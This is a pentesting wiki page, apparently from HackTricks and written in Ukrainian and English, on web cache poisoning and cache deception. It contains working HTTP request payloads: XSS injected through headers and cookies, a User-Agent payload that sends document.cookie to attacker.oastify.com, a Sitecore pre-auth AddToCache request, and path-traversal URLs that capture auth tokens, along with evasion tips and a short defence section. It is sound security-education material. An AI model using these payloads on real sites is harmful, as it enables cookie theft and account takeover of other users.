# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## Різниця

> **Яка різниця між web cache poisoning і web cache deception?**
>
> - У **web cache poisoning** атакувальник змушує додаток зберегти зловмисний контент у кеші, і цей контент видається з кешу іншим користувачам додатку.
> - У **web cache deception** атакувальник змушує додаток зберегти деякий чутливий контент, що належить іншому користувачу, у кеші, а потім витягує цей контент із кешу.

## Cache Poisoning

Cache poisoning спрямований на маніпулювання клієнтським кешем, щоб змусити клієнтів завантажувати ресурси, які є несподіваними, неповними або під контролем атакувальника. Обсяг впливу залежить від популярності постраждалої сторінки, оскільки підроблена відповідь видається виключно користувачам, які відвідують сторінку під час періоду зараження кешу.

Виконання атаки cache poisoning включає кілька кроків:

1. **Виявлення неключових вхідних параметрів**: Це параметри, які, хоча й не є обов'язковими для кешування запиту, можуть змінювати відповідь сервера. Ідентифікація таких параметрів є критичною, оскільки їх можна використати для маніпуляції кешем.
2. **Експлуатація неключових вхідних параметрів**: Після виявлення неключових параметрів наступний крок — з'ясувати, як їх зловживати, щоб змінити відповідь сервера на користь атакувальника.
3. **Забезпечення кешування підробленої відповіді**: Останній крок — гарантувати, що змінена відповідь зберігається в кеші. Таким чином будь-який користувач, який звернеться до постраждалої сторінки під час зараження кешу, отримає підроблену відповідь.

### Виявлення: Перевірка HTTP заголовків

Зазвичай, коли відповідь була **збережена в кеші**, буде **заголовок, що це вказує**; ви можете перевірити, на які заголовки варто звертати увагу в цій публікації: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Виявлення: Кешування кодів помилок

Якщо ви думаєте, що відповідь зберігається в кеші, можна спробувати **відправити запити з некоректним заголовком**, які мають відповідати зі **статусом 400**. Потім спробуйте отримати запит звичайним способом і якщо **відповідь має статус 400**, ви знаєте, що система вразлива (і ви навіть можете виконати DoS).

Ви можете знайти більше варіантів у:

{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Проте зауважте, що **іноді такі коди статусу не кешуються**, тому цей тест може бути ненадійним.

### Виявлення: Ідентифікація та оцінка неключових вхідних параметрів

Ви можете використовувати [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) для **brute-force parameters and headers**, які можуть змінювати відповідь сторінки. Наприклад, сторінка може використовувати заголовок `X-Forwarded-For`, щоб вказати клієнту завантажити скрипт звідти:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Еlicit a harmful response from the back-end server

Після ідентифікації параметра/заголовка перевірте, як він **санітизується** та **де** він **відображається** або впливає на відповідь від сервера. Чи можна ним зловживати (виконати XSS або завантажити JS-код, контрольований вами? здійснити DoS?...)

### Get the response cached

Коли ви **виявили** **сторінку**, яку можна зловживати, який **параметр**/**заголовок** використовувати та **як** його **зловживати**, потрібно добитися кешування сторінки. Залежно від ресурсу, який ви намагаєтеся помістити в кеш, це може зайняти деякий час — можливо доведеться робити спроби кілька секунд.

The header **`X-Cache`** in the response could be very useful as it may have the value **`miss`** when the request wasn't cached and the value **`hit`** when it is cached.\
The header **`Cache-Control`** is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`

Another interesting header is **`Vary`**. This header is often used to **indicate additional headers** that are treated as **part of the cache key** even if they are normally unkeyed. Therefore, if the user knows the `User-Agent` of the victim he is targeting, he can poison the cache for the users using that specific `User-Agent`.

One more header related to the cache is **`Age`**. It defines the times in seconds the object has been in the proxy cache.

When caching a request, be **careful with the headers you use** because some of them could be **used unexpectedly** as **keyed** and the **victim will need to use that same header**. Always **test** a Cache Poisoning with **different browsers** to check if it's working.

## Exploiting Examples

### Easiest example

A header like `X-Forwarded-For` is being reflected in the response unsanitized.\
You can send a basic XSS payload and poison the cache so everybody that accesses the page will be XSSed:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Note that this will poison a request to `/en?region=uk` not to `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

У **[цьому writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** пояснюється наступний простий сценарій:

- The CDN will cache anything under `/share/`
- The CDN will NOT decode nor normalize `%2F..%2F`, therfore, it can be used as **path traversal to access other sensitive locations that will be cached** like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- The web server WILL decode and normalize `%2F..%2F`, and will respond with `/api/auth/session`, which **містить auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies також можуть відображатися у відповіді сторінки. Якщо ви зможете зловживати цим, щоб спричинити XSS, наприклад, ви зможете експлуатувати XSS у кількох клієнтах, які завантажують шкідливу кешовану відповідь.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Note that if the vulnerable cookie is very used by the users, regular requests will be cleaning the cache.

### Створення невідповідностей за допомогою роздільників, нормалізації та крапок <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Перевірте:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Цей розбір пояснює**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) як було можливо вкрасти OpenAI API key з URL на кшталт `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`, тому що все, що відповідає `/share/*`, кешується без нормалізації URL зі сторони Cloudflare, яка виконувалась, коли запит доходив до веб-сервера.

Це також краще пояснено в:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Іноді потрібно **експлуатувати кілька неключових входів**, щоб мати змогу зловживати кешем. Наприклад, ви можете знайти **Open redirect**, якщо встановите `X-Forwarded-Host` на домен під вашим контролем і `X-Forwarded-Scheme` на `http`. Якщо **сервер** перенаправляє всі **HTTP** запити **на HTTPS** і використовує заголовок `X-Forwarded-Scheme` як домен для редіректу, ви можете контролювати, куди веде сторінка через редірект.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Експлуатація при обмеженому `Vary`header

Якщо ви виявили, що заголовок **`X-Host`** використовується як **domain name to load a JS resource**, але заголовок **`Vary`** у відповіді вказує **`User-Agent`**, то потрібно знайти спосіб exfiltrate `User-Agent` жертви та poison the cache, використовуючи цей `User-Agent`:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Надішліть GET request, де запит міститься як у URL, так і в body. Якщо web server використовує значення з body, але cache server кешує значення з URL, то будь-хто, хто звернеться до цього URL, фактично використовуватиме parameter з body. Як-от vuln, який виявив James Kettle на Github website:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Наприклад, у ruby-серверах можна відокремлювати **parameters** символом **`;`** замість **`&`**. Це може бути використано, щоб помістити значення незаключених параметрів всередині ключових і зловживати цим.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Дізнайтеся, як виконувати [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

The [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) can be used to automatically test for web cache poisoning. Він підтримує багато різних технік і є високонастроюваним.

Приклад використання: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Цей реальний патерн поєднує примітив віддзеркалення заголовка з поведінкою CDN/WAF, щоб надійно отруїти кешований HTML, який віддається іншим користувачам:

- Головний HTML віддзеркалював недовірений заголовок запиту (наприклад, `User-Agent`) у виконуваний контекст.
- CDN видаляв cache headers, але існував внутрішній/origin cache. CDN також авто-кешував запити, що закінчуються статичними розширеннями (наприклад, `.js`), тоді як WAF застосовував слабшу інспекцію контенту до GET запитів для статичних ресурсів.
- Особливості потоку запитів дозволяли запиту до шляху `.js` впливати на cache key/variant, що використовувався для наступного головного HTML, дозволяючи міжкористувацький XSS через віддзеркалення заголовка.

Практичний рецепт (спостерігався в популярному CDN/WAF):

1) З чистої IP-адреси (уникати попередніх знижень за репутацією) встановіть зловмисний `User-Agent` через браузер або Burp Proxy Match & Replace.
2) У Burp Repeater підготуйте групу з двох запитів і використайте "Send group in parallel" (single-packet mode працює найкраще):
- Перший запит: GET до ресурсу `.js` на тому ж origin, надсилаючи ваш зловмисний `User-Agent`.
- Одразу після: GET головну сторінку (`/`).
3) Гонка маршрутизації CDN/WAF разом з авто-кешованим `.js` часто сіє отруєний кешований варіант HTML, який потім віддається іншим відвідувачам, що ділять ті ж умови ключа кешу (наприклад, ті ж `Vary` виміри, такі як `User-Agent`).

Example header payload (to exfiltrate non-HttpOnly cookies):
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Оперативні поради:

- Багато CDN приховують заголовки кешу; poisoning може проявитися лише під час багатогодинних циклів оновлення. Використовуйте кілька різних IP-точок і знижуйте швидкість запитів, щоб уникнути тригерів rate-limit або проблем з репутацією.
- Використання IP з власної cloud-інфраструктури CDN іноді покращує узгодженість маршрутизації.
- Якщо присутній строгий CSP, це все одно працює, якщо відображення виконується в головному HTML-контексті і CSP дозволяє inline-виконання або обходиться через контекст.

Вплив:

- Якщо session cookies не мають прапорця `HttpOnly`, можливий zero-click ATO шляхом масового ексфільтрування `document.cookie` від усіх користувачів, яким сервовано poisoned HTML.

Захист:

- Припиніть відображати заголовки запитів у HTML; якщо неминуче — строго кодуйте за контекстом. Узгодьте політики кешування CDN та origin і уникайте варіацій на основі неперевірених заголовків.
- Переконайтесь, що WAF послідовно виконує інспекцію контенту для `.js` запитів і статичних шляхів.
- Встановіть `HttpOnly` (та `Secure`, `SameSite`) на session cookies.

### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

A Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
This writes arbitrary HTML under an attacker‑chosen cache key, enabling precise poisoning once cache keys are known.

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Уразливі приклади

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS пересилав фрагмент всередині URL без його видалення та генерував cache key, використовуючи лише host, path and query (ігноруючи fragment). Тому запит `/#/../?r=javascript:alert(1)` був відправлений на бекенд як `/#/../?r=javascript:alert(1)` і cache key не містив payload всередині, лише host, path and query.

### GitHub CP-DoS

Відправлення некоректного значення в заголовку content-type викликало кешовану відповідь 405. У cache key містився cookie, тому атакувати було можливо лише неавторизованих користувачів.

### GitLab + GCP CP-DoS

GitLab використовує GCP buckets для зберігання статичного контенту. **GCP Buckets** підтримують **заголовок `x-http-method-override`**. Тож можна було відправити заголовок `x-http-method-override: HEAD` і отруїти кеш так, щоб він повертав порожнє тіло відповіді. Також могли підтримуватися методи типу `PURGE`.

### Rack Middleware (Ruby on Rails)

В додатках на Ruby on Rails часто використовується Rack middleware. Призначення Rack коду — взяти значення заголовка **`x-forwarded-scheme`** і встановити його як scheme запиту. Коли надсилається заголовок `x-forwarded-scheme: http`, відбувається 301 redirect на ту ж локацію, що потенційно може спричинити Denial of Service (DoS) для цього ресурсу. Додатково, додаток може враховувати заголовок `X-forwarded-host` і перенаправляти користувачів на вказаний хост. Така поведінка може призвести до завантаження JavaScript-файлів з сервера атакуючого, що становить загрозу безпеці.

### 403 and Storage Buckets

Cloudflare раніше кешував відповіді 403. Спроба доступу до S3 або Azure Storage Blobs з некоректними Authorization заголовками призводила до відповіді 403, яка кешувалася. Хоча Cloudflare припинив кешувати 403 відповіді, така поведінка може все ще мати місце в інших proxy-сервісах.

### Injecting Keyed Parameters

Caches часто включають певні GET параметри в cache key. Наприклад, Fastly's Varnish кешував параметр `size` в запитах. Однак, якщо URL-encoded версія параметра (наприклад, `siz%65`) також була відправлена з некоректним значенням, cache key будувався з використанням коректного `size` параметра. Натомість бекенд обробляв значення з URL-encoded параметра. URL-encoding другого `size` параметра призводив до його опускання кешем, але до його використання бекендом. Присвоєння цього параметра значення 0 призводило до кешованої помилки 400 Bad Request.

### User Agent Rules

Деякі розробники блокують запити з user-agents, що відповідають високонавантаженим інструментам типу FFUF або Nuclei, щоб керувати навантаженням на сервер. Іронічно, такий підхід може створити вразливості, як-от cache poisoning і DoS.

### Illegal Header Fields

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) визначає допустимі символи в іменах заголовків. Заголовки, що містять символи поза вказаним діапазоном **tchar**, теоретично мають викликати 400 Bad Request. На практиці сервери не завжди дотримуються цього стандарту. Помітним прикладом є Akamai, який пересилає заголовки з недійсними символами і кешує будь-яку помилку 400, за умови відсутності заголовка `cache-control`. Було виявлено експлуатований сценарій, коли надсилання заголовка з нелегальним символом, наприклад `\`, призводило до кешованої помилки 400 Bad Request.

### Finding new headers

https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

First of all note that **extensions** such as `.css`, `.js`, `.png` etc are usually **configured** to be **saved** in the **cache.** Therefore, if you access `www.example.com/profile.php/nonexistent.js` the cache will probably store the response because it sees the `.js` **extension**. But, if the **application** is **replaying** with the **sensitive** user contents stored in _www.example.com/profile.php_, you can **steal** those contents from other users.

Other things to test:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
In the example, it is explained that if you load a non-existent page like _http://www.example.com/home.php/non-existent.css_ the content of _http://www.example.com/home.php_ (**with the user's sensitive information**) is going to be returned and the cache server is going to save the result.\
Then, the **attacker** can access _http://www.example.com/home.php/non-existent.css_ in their own browser and observe the **confidential information** of the users that accessed before.

Note that the **cache proxy** should be **configured** to **cache** files **based** on the **extension** of the file (_.css_) and not base on the content-type. In the example _http://www.example.com/home.php/non-existent.css_ will have a `text/html` content-type instead of a `text/css` mime type.

Learn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

## Автоматичні інструменти

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner to find web cache poisoning vulnerabilities in a list of URLs and test multiple injection techniques.

## Посилання

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)


{{#include ../../banners/hacktricks-training.md}}
